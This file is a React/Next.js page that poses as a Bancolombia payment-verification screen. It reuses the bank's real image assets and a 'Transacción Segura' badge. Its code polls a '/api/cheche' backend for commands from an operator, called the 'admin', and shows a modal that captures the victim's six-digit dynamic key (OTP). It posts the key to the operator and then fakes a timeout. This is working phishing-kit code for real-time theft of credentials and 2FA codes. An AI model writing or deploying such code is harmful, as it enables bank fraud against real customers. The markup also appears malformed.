'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

export default function BancolombiaCargandoPage() {
  const [status, setStatus] = useState('processing');
  const [sessionId, setSessionId] = useState('');
  const [showOtpModal, setShowOtpModal] = useState(false);
  const [otp, setOtp] = useState('');
  const [otpLoading, setOtpLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(60);
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const id = searchParams.get('sessionId');
    if (!id) {
      router.push('/checkout');
      return;
    }
    setSessionId(id);
  }, [searchParams, router]);

  useEffect(() => {
    if (!sessionId) return;

    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/cheche?action=check_status&sessionId=${sessionId}`);
        const data = await response.json();
        
        if (data.success) {
          setStatus(data.status);

          if (data.status === 'waiting_otp') {
            setShowOtpModal(true);
            setTimeLeft(60); // Reset timer
          } else if (data.status === 'otp_valid' || data.status === 'otp_submitted') {
            // Siempre mostrar error - no procesar pagos reales
            router.push(`/bancolombia/timeout?sessionId=${sessionId}`);
          } else if (data.status === 'otp_invalid') {
            // OTP was wrong, reset to request new OTP
            setShowOtpModal(false);
            setOtp(''); // Clear previous OTP
            setStatus('password_entered'); // Go back to waiting for admin to request new OTP
          } else if (data.status === 'timeout') {
            router.push(`/bancolombia/timeout?sessionId=${sessionId}`);
          }
        }
      } catch (error) {
        console.error('Error checking status:', error);
      }
    };

    const interval = setInterval(pollStatus, 2000);
    return () => clearInterval(interval);
  }, [sessionId, router]);

  // Countdown timer for OTP
  useEffect(() => {
    if (!showOtpModal || timeLeft <= 0) return;

    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          setShowOtpModal(false);
          setStatus('timeout');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [showOtpModal, timeLeft]);

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp.trim()) return;

    setOtpLoading(true);

    try {
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'submit_otp',
          sessionId,
          otp: otp.trim()
        })
      });

      if (response.ok) {
        setStatus('otp_submitted');
        setShowOtpModal(false);
      }
    } catch (error) {
      console.error('Error submitting OTP:', error);
    } finally {
      setOtpLoading(false);
    }
  };

  const getStatusDisplay = () => {
    switch (status) {
      case 'processing':
      case 'password_entered':
        return {
          title: 'Validando credenciales...',
          message: 'Estamos verificando tu información con Bancolombia',
          showSpinner: true
        };
      case 'waiting_otp':
        return {
          title: 'Esperando clave dinámica...',
          message: 'Revisa tu dispositivo móvil o token para la clave dinámica',
          showSpinner: true
        };
      case 'otp_submitted':
        return {
          title: 'Validando clave dinámica...',
          message: 'Estamos verificando la clave dinámica ingresada',
          showSpinner: true
        };
      case 'otp_error':
        return {
          title: 'Clave dinámica incorrecta',
          message: 'La clave dinámica ingresada es incorrecta. Esperando nueva solicitud...',
          showSpinner: true
        };
      case 'timeout':
        return {
          title: 'Tiempo agotado',
          message: 'El tiempo de espera ha expirado. Por favor intenta nuevamente más tarde.',
          showSpinner: false
        };
      default:
        return {
          title: 'Procesando...',
          message: 'Por favor espera mientras procesamos tu solicitud',
          showSpinner: true
        };
    }
  };

  const statusDisplay = getStatusDisplay();

  return (
    <div 
      className="min-h-screen bg-gray-50 relative"
      style={{
        fontFamily: '"Open Sans", Arial, sans-serif',
        cursor: 'url("https://svpersonas.apps.bancolombia.com/assets/images/light-cursor-small.png"), auto'
      }}
    >
      {/* Official Bancolombia background */}
      <div 
        className="min-h-screen bg-no-repeat bg-center flex items-center justify-center p-4"
        style={{
          backgroundImage: 'url("https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg")',
          backgroundSize: '100%'
        }}
      >
        <div className="max-w-md w-full relative z-10">
          {/* Header */}
          <div className="text-center mb-8">
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-6 mx-auto mb-6 object-contain"
            />
          </div>

          {/* Status Card */}
          <div className="bg-white rounded-2xl shadow-lg p-8 border border-gray-100">
            <div className="text-center">
              {statusDisplay.showSpinner && (
                <div className="mb-6">
                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
                </div>
              )}

              <h2 className="text-xl font-bold text-gray-900 mb-3">
                {statusDisplay.title}
              </h2>
              <p className="text-gray-600 text-sm mb-6">
                {statusDisplay.message}
              </p>

            {/* Removed otp_error button - now it continues the flow */}

            {status === 'timeout' && (
              <button
                onClick={() => router.push('/checkout')}
                className="w-full py-3 px-6 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition font-medium"
              >
                Intentar nuevamente más tarde
              </button>
            )}

            {statusDisplay.showSpinner && (
              <div className="flex items-center justify-center text-sm text-gray-500 mb-4">
                <svg className="w-4 h-4 mr-2 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                </svg>
                No cierres esta ventana
              </div>
            )}

            <div className="flex items-center justify-center space-x-2 text-green-600">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              <span className="text-sm font-medium">Transacción Segura</span>
            </div>
          </div>

          {/* Footer Logo */}
          <div className="text-center mt-8">
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-5 mx-auto opacity-60"
            />
          </div>
        </div>
      </div>
    </div>

      {/* Clave Dinámica Modal */}
      {showOtpModal && (
        <div 
          className="fixed inset-0 flex items-center justify-center p-4 z-50"
          style={{
            backgroundColor: 'rgba(80, 80, 80, 0.75)',
            fontFamily: '"Open Sans", Arial, sans-serif'
          }}
        >
          <div 
            className="bg-white rounded-2xl shadow-2xl w-full"
            style={{ maxWidth: '480px' }}
          >
            
            {/* Content */}
            <div className="px-8 py-8">
              
              {/* Icon */}
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center">
                  <svg className="w-8 h-8 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                </div>
              </div>

              {/* Title */}
              <h2 className="text-2xl font-bold text-gray-900 text-center mb-3">
                Clave Dinámica
              </h2>

              {/* Description */}
              <p className="text-gray-600 text-center text-sm mb-6">
                Ingresá la clave dinámica que aparece en tu dispositivo
              </p>

              {/* Form */}
              <form onSubmit={handleOtpSubmit} className="space-y-4">
                {/* Input */}
                <div>
                  <input
                    type="text"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    placeholder="000000"
                    className="w-full h-14 text-center text-2xl font-mono border-2 border-blue-500 rounded-lg focus:border-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-100 tracking-widest transition-all"
                    style={{ 
                      color: '#cbd5e1',
                      letterSpacing: '0.4em'
                    }}
                    maxLength={6}
                    disabled={otpLoading}
                    autoFocus
                  />
                </div>

                {/* Button */}
                <button
                  type="submit"
                  disabled={otp.length !== 6 || otpLoading}
                  className="w-full py-3 bg-gray-400 hover:bg-gray-500 disabled:bg-gray-300 text-white rounded-lg font-semibold text-base transition-all disabled:cursor-not-allowed"
                >
                  {otpLoading ? (
                    <span className="flex items-center justify-center">
                      <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Validando...
                    </span>
                  ) : (
                    'Confirmar Clave'
                  )}
                </button>
              </form>
              
            </div>
            
          </div>
        </div>
      )}
    </div>
  );
}